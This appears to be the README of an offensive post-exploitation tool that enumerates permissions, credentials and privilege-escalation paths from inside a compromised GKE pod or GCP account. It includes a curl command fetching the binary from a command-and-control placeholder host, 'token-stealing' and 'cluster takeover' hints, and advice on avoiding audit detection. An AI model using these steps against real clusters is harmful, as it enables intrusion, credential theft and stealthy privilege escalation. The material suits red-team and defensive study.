# Kraken's Eye

Passive post-exploitation enumerator for GKE clusters and GCP accounts.
One static Go binary, zero runtime dependencies. Drop it into a compromised
pod and it answers three questions, linpeas-style:

1. Who am I (Kubernetes SA, GCP service account, scopes, token lifetime)
2. What can I do (RBAC matrix, GCP testIamPermissions)
3. What does that unlock (`-> attack:` lines under every finding)

Kraken's Eye never mutates anything: get/list/test requests only. No pod,
secret, SA, key or IAM creation. The only "active" idea it automates is
reading what you are already allowed to read.

## Build

```sh
make dist        # static linux/amd64 + arm64 in dist/
```

Prebuilt binaries: `dist/krakenseye-amd64`, `dist/krakenseye-arm64`.
Pick by runner arch (`uname -m`).

## Use

In a pod, no arguments needed; the SA token, API server and namespace are
auto-detected:

```sh
./krakenseye
```

Common flags:

```sh
-quiet          # hide INFO, leave CRIT/WARN
-no-color       # pipe/output friendly
-json out.json  # structured findings for reporting
-skip-k8s       # only GCP + pod checks
-skip-cloud     # only k8s + pod checks
```

Credential overrides:

```sh
-server https://10.0.0.1:443 -token <sajwt>            # raw API access
-kubeconfig /tmp/kubeconfig                            # bearer-token users only
-gcp-token <oauth>                                     # skip metadata acquisition
```

## Output anatomy

Findings carry three severities:

- `INFO` a fact (namespace list, node IPs, token audience)
- `WARN` something to examine (restricted scopes, dangerous capabilities)
- `CRIT` confirmed ability or credential (secrets readable, kube-env
  readable, workload identity SA, static SA keys)

CRIT/WARN findings carry an `-> attack:` line with the concrete next move.

## Checks

### Kubernetes
- SA token claims: subject, namespace, expiry, audiences. Long-lived
  tokens flagged for reuse after pod eviction.
- API reachability, version, anonymous access probe.
- SelfSubjectAccessReview matrix over the dangerous grants from the
  k8s privesc playbook: secrets, pod create, `serviceaccounts/token`,
  `nodes/proxy`, exec/attach/portforward, impersonate, bind/escalate,
  CSR, PV create, ephemeral containers, networkpolicies.
- Cluster inventory: namespaces, pods + hot pod detection (privileged,
  host namespaces, hostPath, SYS_ADMIN/ALL), services, nodes.
- Kubelet probing: `/pods` on 10255 + 10250 against node IPs if nodes
  are readable. Strictly read-only endpoints.
- Workload identity: SAs with `iam.gke.io/gcp-service-account` become
  GCP pivot findings with the token-stealing recipe.
- Secrets: presence/type summary only; the fact you can read them is
  reported as CRIT, data is not dumped by the tool.

### GKE metadata
- Project-id, zone, instance name.
- Node attributes: `kube-env` (with cluster CA + kubelet client
  creds = cluster takeover), `kubelet-config`, `configure-sh`,
  startup/shutdown scripts.
- Node SA email + OAuth scopes, scoped token acquisition, and scope
  mapping to what the token can reach.

### GCP API
- `tokeninfo` whoami.
- `testIamPermissions` on the project with a bundled permission list;
  allowed permissions map to privilege escalation hints (actAs,
  keys.create, setIamPolicy...).
- Read-only resource sweeps depending on what is allowed: GKE clusters
  (+ get-credentials hint), compute zones/instances, storage buckets,
  Secret Manager secrets, service accounts and their USER_MANAGED keys.

### Pod surface
- Capabilities (`SYS_ADMIN`, `SYS_PTRACE`, `DAC_OVERRIDE` flagged).
- Runtime sockets mounted (docker/containerd/crio/podman).
- Host-ish mounts.
- Credential files: ADC JSON, kubeconfigs, docker configs, GitHub runner
  registration creds (`~/.credentials_rsaparams`), known gcloud paths.
- Credential-like env var names (names reported, values not printed).

## Typical flow

```sh
curl -fsSL <c2>/krakenseye-linux-arm64 -o /tmp/ke && chmod +x /tmp/ke
/tmp/ke --quiet --no-color --json /tmp/ke.json
```

Read CRIT first. Each one has an `-> attack:` line; the reference attack
knowledge lives in:
- https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html
- https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html

## Detection notes

Get/list requests are normal pod traffic. testIamPermissions stands out
only if someone audits cloudresourcemanager; keep the count low with
`--quiet` output and prefer JSON for reporting back to the team.

## Layout

```
cmd/krakenseye      CLI wiring
internal/k8s        API client, RBAC matrix, inventory, kubelet probes
internal/gcp        metadata, IAM probing, resource sweeps
internal/probe      pod-local facts (caps, mounts, cred files)
internal/report     sectioned terminal output + JSON
```
